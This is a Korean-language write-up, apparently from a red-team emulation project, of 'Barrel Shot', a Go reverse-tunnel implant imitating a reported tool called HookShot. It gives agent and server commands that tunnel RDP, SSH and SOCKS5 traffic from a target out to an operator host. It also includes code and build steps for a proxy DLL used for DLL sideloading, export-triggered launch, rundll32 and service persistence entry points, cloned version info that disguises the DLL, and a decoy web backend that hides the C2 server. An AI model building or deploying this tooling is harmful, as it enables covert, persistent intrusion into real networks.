# 6. Barrel-Shot

## Barrel Shot

### 코드

[https://github.com/ChoiSG/Operation-Triple-Barrel/tree/main/barrel-shot](https://github.com/ChoiSG/Operation-Triple-Barrel/tree/main/barrel-shot)

### 데모

{% file src="../.gitbook/assets/barrel-shot-demo.mp4" %}

### 개요

HookShot은 오퍼레이션 더블 배럴 보고서 13\~14, 35페이지에 등장하는 RDP/SSH 터널링 도구다. 내부 네트워크의 RDP, SSH 등의 서비스에 외부에서 접근하기 위한 도구로, Chisel이나 Ligolo-ng과 비슷한 역할을 한다. 보고서 35페이지에서 DLL Sideloading으로 실행했다고 기술되어 있는데, 이 점을 반영해 처음부터 DLL Sideloading이 가능하도록 만들었다.

아마 C나 C++로 만들어진 악성코드 같은데, 시간이 너무 없어 (3일) Barrel shot은 golang으로 제작했다. AI를 활용해 만들다보니, 사실상 코드 베이스는 chisel과 ligolo-ng의 것을 가져다 사용했다고 봐도 무방하다.

Go로 작성했고, SSH-over-WebSocket 구조를 사용한다.

### 구조

```
  오퍼레이터                                 타겟 네트워크
  +-------------------+                   +-------------------+
  |  barrel-shot      |                   |  barrel-shot      |
  |  server           |<--[WSS/SSH]-------+  agent            |
  |                   |                   |                   |
  |  - HTTPS listener |                   |  - reverse conn   |
  |  - tunnel binder  |                   |  - SOCKS5 proxy   |
  |                   |                   |  - reconnect loop |
  +-------------------+                   +-------------------+
        |                                       |
        v                                       v
   RDP client                             target:3389 (RDP)
   SSH client                             target:22   (SSH)
   proxychains                            target:*    (SOCKS5)
```

에이전트가 타겟 호스트에서 오퍼레이터 서버로 WebSocket 연결을 맺고, 그 안에서 SSH 세션을 만든다. SSH가 암호화와 멀티플렉싱을 다 해주기 때문에 별도의 커스텀 암호화가 필요 없다. 오퍼레이터 쪽에서는 로컬 포트가 열리고, 해당 포트에 RDP/SSH 클라이언트를 연결하면 트래픽이 SSH 채널을 타고 타겟 네트워크 안으로 들어간다.

```bash
# 서버 (오퍼레이터)
barrel-shot server -l 0.0.0.0:8443 --auth op:s3cret

# 에이전트 (타겟) — RDP + SSH + SOCKS5 터널
barrel-shot agent --tls-skip-verify --auth op:s3cret https://operator:8443 R:socks
```

### DLL Sideloading

보고서에서 HookShot이 DLL Sideloading으로 실행됐다고 명시되어 있어서, 빌드 파이프라인에 이를 포함시켰다.

Barrel Shot의 DLL 빌드는 프록시 DLL 패턴을 사용한다. 타겟 DLL(예: `python315.dll`)의 PE export table을 파싱해서, 모든 export 함수를 원본 DLL로 포워딩하는 C 코드를 자동 생성한다. 이 프록시 코드와 Barrel Shot 에이전트를 함께 컴파일하면, 정상 프로그램이 해당 DLL을 로드할 때 원래 기능은 그대로 동작하면서 에이전트가 백그라운드에서 실행된다.

```bash
make dll \
  PROXY=./python315.dll \
  SERVER=https://operator.com:443 \
  AUTH=op:s3cret \
  REMOTES=R:13389:10.10.5.50:3389,R:socks \
  TLS_SKIP=1 \
  FUNCTION=Py_Main
```

`FUNCTION` 파라미터가 중요하다. 에이전트가 시작되는 트리거를 DLL 로드 시점(`DllMain`, 기본값)이 아니라 특정 export 함수가 호출되는 시점으로 지정할 수 있다. 위 예시에서는 호스트 프로그램(`pythonw.exe`)이 `Py_Main`을 호출하는 순간 에이전트가 시작된다.

#### 트리거 모드: DllMain vs. Export Function

에이전트 시작 시점을 두 가지 모드로 제어할 수 있다.

**1. `FUNCTION=DllMain` (기본값):** DLL이 로드되는 즉시 Go 런타임의 `init()`에서 에이전트를 시작한다.

```go
// exports.go
func init() {
    if embeddedTrigger != "" && embeddedTrigger != "DllMain" {
        return  // 트리거 함수가 지정되어 있으면 여기서 시작하지 않음
    }
    if HasEmbeddedConfig() {
        go RunDLL()
    }
}
```

**2. `FUNCTION=Py_Main` (export 트리거):** DLL 로드 시에는 아무것도 안하고, 호스트 프로그램이 해당 export 함수를 호출할 때 에이전트를 시작한다. `proxygen`이 생성하는 C 코드에서 해당 함수의 stub에 `GoNow()` 호출이 삽입된다.

```c
// proxygen이 자동 생성 — 트리거 함수 stub
__declspec(dllexport) void * Py_Main(
    void *a1,void *a2,void *a3,void *a4,
    void *a5,void *a6,void *a7,void *a8,
    void *a9,void *a10,void *a11,void *a12) {
    GoNow();                                              // 에이전트 시작 (goroutine)
    proxy_init();
    ProxyFn f = (ProxyFn)proxy_fn[1287];                  // 원본 Py_Main 호출
    if (f) f(a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12);
    Sleep(0xFFFFFFFF);                                    // 호스트 프로세스 유지
    return 0;
}
```

Export 트리거가 유용한 이유는, DLL이 로드되는 시점에는 프로세스 초기화가 아직 진행 중일 수 있기 때문이다. 예를 들어 Loader Lock이 잡혀 있는 상태에서 네트워크 연결을 시도하면 데드락이 걸릴 수 있다. Export 트리거를 사용하면 프로세스 초기화가 끝난 뒤 안전하게 에이전트를 시작할 수 있다.

`GoNow()`는 Go 쪽에서 export된 CGO 함수로, `RunDLL()`을 goroutine으로 실행한다. `sync.Once`로 감싸져 있어 여러 번 호출돼도 에이전트는 한 번만 시작된다.

```go
// exports.go

//export GoNow
func GoNow() {
    go RunDLL()
}

//export RunAgent
func RunAgent() {
    RunDLL()  // blocking — rundll32 용
}

//export ServiceMain
func ServiceMain() {
    RunDLL()  // blocking — 서비스 등록 지속성 용
}

func RunDLL() {
    dllOnce.Do(func() {
        c := &Config{}
        applyEmbedded(c)
        if c.Server == "" { return }
        a, err := New(c)
        if err != nil { return }
        a.Run(context.Background())
    })
}
```

`RunAgent`와 `ServiceMain`은 blocking 호출이라, `rundll32.exe python315.dll,RunAgent` 같은 방식으로도 실행할 수 있다.

#### Proxy 코드 생성

`proxygen`이 타겟 DLL의 PE export table을 직접 파싱해서 모든 named export를 추출한다. 이미 forwarded된 export (RVA가 export directory 범위 안에 있는 경우)는 건너뛴다.

```go
// cmd/proxygen/main.go — export 추출 핵심
func extractExports(f *pe.File) ([]string, error) {
    // PE DataDirectory[0]에서 export directory RVA/Size 추출
    // ...
    for i := uint32(0); i < numNames; i++ {
        // AddressOfNames[i] → 함수 이름
        // AddressOfNameOrdinals[i] → 함수 인덱스
        // AddressOfFunctions[funcIdx] → 함수 RVA

        // forwarded export는 스킵
        if funcRVA >= dirRVA && funcRVA < dirRVA+dirSize {
            continue
        }
        names = append(names, name)
    }
    return names, nil
}
```

추출된 export 목록으로 `proxy_gen.c`를 생성한다. 원본 DLL은 `python315_.dll`(언더스코어 추가)로 이름을 바꿔 같은 디렉토리에 놓고, 프록시 DLL이 원본 이름(`python315.dll`)을 차지한다.

```c
// proxygen이 자동 생성 — proxy_init()
static HMODULE proxy_dll;
static void *proxy_fn[2006];    // python315.dll 기준 2006개 export

static void proxy_init(void) {
    if (proxy_dll) return;
    proxy_dll = LoadLibraryW(L"python315_.dll");  // 이름 변경된 원본 DLL
    if (!proxy_dll) return;
    proxy_fn[0] = GetProcAddress(proxy_dll, "PyArg_Parse");
    proxy_fn[1] = GetProcAddress(proxy_dll, "PyArg_ParseTuple");
    // ... 2006개
}

// 일반 export stub — 그대로 포워딩
__declspec(dllexport) void * PyArg_Parse(
    void *a1,void *a2,void *a3,void *a4,
    void *a5,void *a6,void *a7,void *a8,
    void *a9,void *a10,void *a11,void *a12) {
    proxy_init();
    ProxyFn f = (ProxyFn)proxy_fn[0];
    return f ? f(a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12) : 0;
}
```

`version.dll`, `winmm.dll`, `dbghelp.dll` 등 아무 DLL이나 사용 가능하다. `proxygen`이 PE export table을 직접 파싱하기 때문에 함수 목록을 하드코딩할 필요가 없다.

#### Version Info Cloning

빌드 파이프라인에는 `versioninfo.py`도 포함되어 있다. 원본 DLL의 PE 리소스에서 `VS_FIXEDFILEINFO`와 `StringFileInfo`를 추출해 `.rc` 파일을 만들고, `windres`로 컴파일해서 `.syso`로 Go 빌드에 자동 링크한다. 결과물인 프록시 DLL이 원본과 동일한 파일 버전, 제품명, 저작권 정보를 가지게 된다.

```python
# versioninfo.py — 원본 DLL의 버전 정보 복제
info = extract_version_info("python315.dll")
# → file_version: (3, 15, 0, 0)
# → strings: {"ProductName": "Python", "FileDescription": "Python Core", ...}

rc_content = generate_rc(info)  # .rc 파일 생성
# → x86_64-w64-mingw32-windres로 .syso 컴파일
# → Go 빌드 시 자동 링크
```

### 임베디드 설정

에이전트 설정(서버 주소, 인증 정보, 터널 정의, 트리거 함수)은 빌드 타임에 Go의 `-ldflags -X`로 바이너리에 박아넣는다.

```go
// embed.go — 빌드 타임에 설정되는 변수들
var (
    embeddedServer      string  // -X 'barrel-shot/agent.embeddedServer=wss://...'
    embeddedAuth        string
    embeddedFingerprint string
    embeddedRemotes     string
    embeddedTLSSkip     string
    embeddedTrigger     string  // -X 'barrel-shot/agent.embeddedTrigger=Py_Main'
)
```

설정이 임베디드되어 있으면 인자 없이 실행해도 바로 연결된다. DLL Sideloading 시나리오에서는 CLI 인자를 넘길 방법이 없기 때문에 필수적인 기능이다.

### 그 외

* **Reconnect**: 연결이 끊기면 exponential backoff + jitter (1초\~5분)로 재접속한다
* **SOCKS5**: `R:socks` 터널을 정의하면 에이전트 측에 SOCKS5 프록시가 열려, `proxychains`를 통해 내부 네트워크 어디든 접근 가능하다
* **Backend proxy**: 서버의 `--backend` 옵션으로 비에이전트 HTTP 요청을 정상 웹서버로 리버스 프록시할 수 있다. 누군가 서버 URL에 브라우저로 접속하면 정상 웹사이트가 보인다
* **TLS**: 인증서가 없으면 self-signed를 자동 생성한다. 실제 오퍼레이션에서는 CDN 뒤에 놓기 때문에 CDN이 TLS termination을 해준다
